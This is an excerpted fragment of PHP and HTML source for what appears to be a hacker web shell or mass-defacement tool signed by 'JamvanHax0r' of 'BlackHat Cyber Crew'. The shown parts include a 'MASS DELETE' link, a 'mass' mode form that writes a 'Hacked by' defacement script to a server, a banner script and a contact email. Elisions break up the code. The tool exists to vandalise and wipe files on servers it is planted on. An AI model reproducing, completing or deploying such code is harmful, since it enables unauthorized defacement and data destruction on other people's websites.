...
<a href='?go=delete'>MASS DELETE</a>
</div></head><br />
<script>
var text="Code By JamvanHax0r";
var delay=10;
var currentChar=1;
...
<?php
/**
We are [#] BlackHat Cyber Crew [#],
Nothing Security Perfect
...
elseif($_GET['go'] == 'mass'){
	...
	<font style='text-decoration: underline;'>Isi Script:</font><br>
	<textarea name='script' style='width: 450px; height: 200px;'>Hacked by JamvanHax0r | BlackHat Cyber Crew</textarea><br>
	<input type='submit' name='start' value='Goo!' style='width: 450px;' class='btn btn-success btn-sm'>
	</form>";
		echo"Need help? <u><a href='mailto: JamvanHax0r@gmail.com' target='_blank'>Contact Here</a><u/></center>";
